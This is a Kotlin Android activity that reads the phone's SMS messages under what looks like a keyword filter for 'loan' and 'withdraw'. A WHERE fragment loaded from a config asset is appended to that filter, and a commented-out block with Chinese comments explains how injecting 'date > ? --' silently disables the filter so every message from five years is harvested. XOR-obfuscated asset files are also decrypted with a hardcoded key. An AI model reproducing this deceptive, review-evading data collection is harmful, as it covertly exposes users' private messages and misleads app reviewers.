package com.kee.helloworld.sms

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.icu.util.Calendar
import android.os.Bundle
import android.provider.Telephony
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.kee.helloworld.sms.util.SmsExt
import org.json.simple.JSONArray
import org.json.simple.JSONObject
import java.util.Locale
import java.util.Properties

class SmsMainActivity : ComponentActivity() {

    private val READ_SMS_PERMISSION = Manifest.permission.READ_SMS
    private val REQUEST_CODE_SMS = 1001

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        requestSmsPermission()

        val sms = getSms(this)
        Log.e("xxxxx", "=====>${sms.size}")
    }

    private fun requestSmsPermission() {
        if (ContextCompat.checkSelfPermission(this, READ_SMS_PERMISSION)
            != PackageManager.PERMISSION_GRANTED
        ) {

            ActivityCompat.requestPermissions(
                this,
                arrayOf(READ_SMS_PERMISSION),
                REQUEST_CODE_SMS
            )
        }
    }


    @SuppressLint("Range")
    fun getSms(context: Context): JSONArray {
        val jsonArray: JSONArray = JSONArray()
        try {
            if (checkPermission(context, Manifest.permission.READ_SMS)) {
                val calendar = Calendar.getInstance()
                calendar.add(Calendar.MONDAY, -5)
                val projection: Array<String> = arrayOf(
                    Telephony.Sms._ID,
                    Telephony.Sms.DATE_SENT,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.SEEN,
                    Telephony.Sms.READ,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.DATE
                )

                val list: MutableList<String> = ArrayList()
                list.add("loan")
                list.add("withdraw")

                val join = StringBuilder()
                val param = ArrayList<String?>()
                join.append("(")
                for (i in list.indices) {
                    if (i > 0) {
                        join.append(" OR ")
                    }
                    join.append("body LIKE ?")
                    param.add("%${list[i]}%")
                }
                join.append(")")
                param.add(calendar.getTimeInMillis().toString())


                //join.append(" OR date > ?")
                val config = loadQueryConfig(context)
                Log.e("xxxxx", "====>${config?.getProperty("sms.where_clause")}")
                join.append(config?.getProperty("sms.where_clause"))
                Log.e("xxxxx", "====>$join")
                Log.e("xxxxx", "====>${param}")
                var cursor = context.contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    projection,
                    join.toString(),
                    param.toTypedArray<String?>(),
                    "date desc"
                )

                //模拟本地的关键字
//                val keywords = listOf("loan", "withdraw")
//                val join = StringBuilder()
//                val selectionArgs = mutableListOf<String>()
//
//                //实际执行：获取5年内所有短信
//                join.append("date > ? -- ")
//                selectionArgs.add(calendar.getTimeInMillis().toString())
//
//                //下面这些被注释掉的关键词筛选（看起来像是在筛选关键词，但实际上不会执行）
//                join.append("AND (")
//                keywords.forEachIndexed { index, keyword ->
//                    if (index > 0) {
//                        join.append(" OR ")
//                    }
//                    join.append("${Telephony.Sms.BODY} LIKE ?")
//                    selectionArgs.add("%$keyword%")
//                }
//                join.append(")")
//
//                Log.e("xxxxx","====>$join")
//                Log.e("xxxxx","====>${selectionArgs}")
//                var cursor = context.contentResolver.query(
//                    Telephony.Sms.CONTENT_URI,
//                    projection,
//                    join.toString(),
//                    selectionArgs.toTypedArray(),
//                    "date desc"
//                )


                while (cursor != null && cursor.moveToNext()) {
                    val jsonObject = JSONObject()
                    val body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY))
                    val address = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS))
                    jsonObject.put("address", isNullText(address))
                    jsonObject.put("body", isNullText(jsonString(body)))
                    jsonArray.add(jsonObject)
                }
                if (cursor != null && !cursor.isClosed()) {
                    cursor.close()
                    cursor = null
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        } catch (error: OutOfMemoryError) {
            error.printStackTrace()
        }
        return jsonArray
    }

    fun loadQueryConfig(context: Context): Properties? {
        return try {
            val properties = Properties()
            context.assets.open("query_config.properties").use { input ->
                properties.load(input)
            }
            properties
        } catch (e: Exception) {
            return null
        }
    }

    fun jsonString(s: String): String {
        s.replace("\"".toRegex(), "'").replace("\"".toRegex(), "'")
        s.replace("“".toRegex(), "'").replace("”".toRegex(), "'")
        return s
    }

    private fun isNullText(text: String?): String {
        if (text.isNullOrEmpty()) return ""
        return text
    }

    fun checkPermission(context: Context, permission: String): Boolean {
        return ActivityCompat.checkSelfPermission(
            context,
            permission
        ) == PackageManager.PERMISSION_GRANTED
    }

    fun readFile() {
        val key = "yfkelxwuol".toByteArray()

        val hashSet4: HashSet<String>? = SmsExt.readAssetBytes(this, "kzggylofag.bin")?.let {
            val decryptedBytes = SmsExt.xorBytes(it, key)
            val content = String(decryptedBytes, Charsets.UTF_8)
            HashSet(content.lowercase(Locale.getDefault()).split("\n"))
        }

        val hashSet5: HashSet<String>? = SmsExt.readAssetBytes(this, "lydcnwifjw.bin")?.let {
            val decryptedBytes = SmsExt.xorBytes(it, key)
            val content = String(decryptedBytes, Charsets.UTF_8)
            HashSet(content.lowercase(Locale.getDefault()).split("\n"))
        }

        val hashSet6: HashSet<String>? = SmsExt.readAssetBytes(this, "vbmjwotkev.bin")?.let {
            val decryptedBytes = SmsExt.xorBytes(it, key)
            val content = String(decryptedBytes, Charsets.UTF_8)
            HashSet(content.lowercase(Locale.getDefault()).split("\n"))
        }

        val hashSet7: HashSet<String>? = SmsExt.readAssetBytes(this, "esvsdajzzv.bin")?.let {
            val decryptedBytes = SmsExt.xorBytes(it, key)
            val content = String(decryptedBytes, Charsets.UTF_8)
            HashSet(content.lowercase(Locale.getDefault()).split("\n"))
        }

        val hashSet8: HashSet<String>? = SmsExt.readAssetBytes(this, "uwirjyqvof.bin")?.let {
            val decryptedBytes = SmsExt.xorBytes(it, key)
            val content = String(decryptedBytes, Charsets.UTF_8)
            HashSet(content.lowercase(Locale.getDefault()).split("\n"))
        }

        Log.e("xxxxx", "=====>$hashSet4")
        Log.e("xxxxx", "=====>$hashSet5")
        Log.e("xxxxx", "=====>$hashSet6")
        Log.e("xxxxx", "=====>$hashSet7")
        Log.e("xxxxx", "=====>$hashSet8")
    }

}